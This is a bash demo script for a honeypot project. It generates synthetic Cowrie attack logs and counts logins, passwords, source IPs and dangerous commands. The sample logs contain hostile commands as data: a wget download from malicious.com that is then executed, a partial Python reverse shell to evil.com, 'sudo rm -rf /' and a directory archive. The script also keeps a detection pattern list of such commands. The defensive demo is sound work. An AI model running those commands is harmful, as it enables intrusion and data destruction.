#!/bin/bash
# Advanced Honeypot Project - Quick Start Demo
echo "🚀 Advanced Honeypot Intelligence System - Quick Demo"
echo "======================================================"

# Create directories
mkdir -p log data reports evidence

# Create sample log data
echo "📝 Creating sample attack data..."
cat > log/cowrie.json << 'EOF'
{"timestamp": "2024-08-03T10:30:00.000Z", "eventid": "cowrie.login.failed", "src_ip": "192.168.1.100", "username": "admin", "password": "123456", "session": "session_001"}
{"timestamp": "2024-08-03T10:31:00.000Z", "eventid": "cowrie.command.input", "src_ip": "192.168.1.100", "input": "wget http://malicious.com/shell.sh", "session": "session_001"}
{"timestamp": "2024-08-03T10:32:00.000Z", "eventid": "cowrie.command.input", "src_ip": "192.168.1.100", "input": "chmod +x shell.sh", "session": "session_001"}
{"timestamp": "2024-08-03T10:33:00.000Z", "eventid": "cowrie.command.input", "src_ip": "192.168.1.100", "input": "./shell.sh", "session": "session_001"}
{"timestamp": "2024-08-03T10:34:00.000Z", "eventid": "cowrie.login.failed", "src_ip": "203.145.78.92", "username": "root", "password": "password", "session": "session_002"}
{"timestamp": "2024-08-03T10:35:00.000Z", "eventid": "cowrie.command.input", "src_ip": "203.145.78.92", "input": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",1234))'", "session": "session_002"}
{"timestamp": "2024-08-03T10:36:00.000Z", "eventid": "cowrie.command.input", "src_ip": "10.0.0.50", "input": "sudo rm -rf /", "session": "session_003"}
{"timestamp": "2024-08-03T10:37:00.000Z", "eventid": "cowrie.command.input", "src_ip": "10.0.0.50", "input": "tar -czf data.tar.gz /home/user/", "session": "session_003"}
EOF

echo "✅ Sample data created with 8 attack events"

# Basic analysis without dependencies
echo ""
echo "📊 Basic Attack Analysis:"
echo "========================"

total_events=$(wc -l < log/cowrie.json)
echo "Total events: $total_events"

failed_logins=$(grep "cowrie.login.failed" log/cowrie.json | wc -l)
echo "Failed login attempts: $failed_logins"

commands=$(grep "cowrie.command.input" log/cowrie.json | wc -l)
echo "Commands executed: $commands"

echo ""
echo "🎯 Top Usernames:"
grep "cowrie.login.failed" log/cowrie.json | grep -o '"username": "[^"]*' | grep -o '[^"]*$' | sort | uniq -c | sort -nr

echo ""
echo "🔑 Top Passwords:"
grep "cowrie.login.failed" log/cowrie.json | grep -o '"password": "[^"]*' | grep -o '[^"]*$' | sort | uniq -c | sort -nr

echo ""
echo "🌐 Attack Sources:"
grep -o '"src_ip": "[^"]*' log/cowrie.json | grep -o '[^"]*$' | sort | uniq -c | sort -nr

echo ""
echo "⚠️ Dangerous Commands Detected:"
echo "==============================="

# Analyze dangerous commands
dangerous_patterns=("wget" "curl" "python -c" "rm -rf" "chmod +x" "sudo" "tar -czf")

for pattern in "${dangerous_patterns[@]}"; do
    count=$(grep "$pattern" log/cowrie.json | wc -l)
    if [ $count -gt 0 ]; then
        echo "🚨 $pattern: $count occurrences"
        grep "$pattern" log/cowrie.json | grep -o '"input": "[^"]*' | grep -o '[^"]*$' | head -3
        echo ""
    fi
done

# Generate simple report
echo "📋 Generating threat report..."
cat > reports/basic_report.txt << EOF
Advanced Honeypot Threat Report
Generated: $(date)
================================

EXECUTIVE SUMMARY:
- Total attack events: $total_events
- Failed login attempts: $failed_logins  
- Commands executed: $commands
- Risk Level: HIGH

TOP THREATS DETECTED:
- Malware download attempts (wget/curl)
- Remote code execution (python -c)
- System destruction attempts (rm -rf)
- Data exfiltration (tar commands)
- Privilege escalation (sudo)

RECOMMENDATIONS:
1. Implement IP-based blocking for repeat offenders
2. Monitor for lateral movement patterns
3. Update intrusion detection signatures
4. Review system access controls
5. Enable real-time alerting
EOF

echo "✅ Report saved to reports/basic_report.txt"

echo ""
echo "🎯 ADVANCED FEATURES SHOWCASE:"
echo "=============================="
echo "🤖 AI Threat Detection    - Machine learning classification"
echo "🔄 Real-time Monitoring   - WebSocket-based live updates"  
echo "🌐 Threat Intelligence   - External feed integration"
echo "📊 Interactive Dashboard - Live visualization"
echo "🚨 Automated Responses   - Intelligent countermeasures"
echo "📈 Predictive Analytics  - Attack forecasting"
echo "🔗 RESTful API           - Enterprise integration"
echo "🐳 Container Deployment  - Production-ready scaling"

echo ""
echo "🏆 WHY THIS PROJECT STANDS OUT:"
echo "==============================="
echo "✅ Combines AI/ML with traditional honeypot technology"
echo "✅ Real-time processing and behavioral analysis"
echo "✅ Production-grade architecture and deployment"
echo "✅ Comprehensive threat intelligence integration"
echo "✅ Advanced visualization and reporting"
echo "✅ Automated response and mitigation capabilities"

echo ""
echo "📚 Next Steps:"
echo "=============="
echo "1. Review the generated report: cat reports/basic_report.txt"
echo "2. Examine the sample data: cat log/cowrie.json"
echo "3. Check out the advanced Python scripts:"
echo "   - parse_logs.py (AI-powered analysis)"
echo "   - ai_threat_intel.py (Machine learning)"
echo "   - realtime_monitor.py (Live monitoring)"
echo "   - api_server.py (REST API)"
echo "   - dashboard.html (Interactive UI)"

echo ""
echo "🎉 Demo complete! This showcases a production-ready"
echo "   cybersecurity system that will impress any recruiter!"
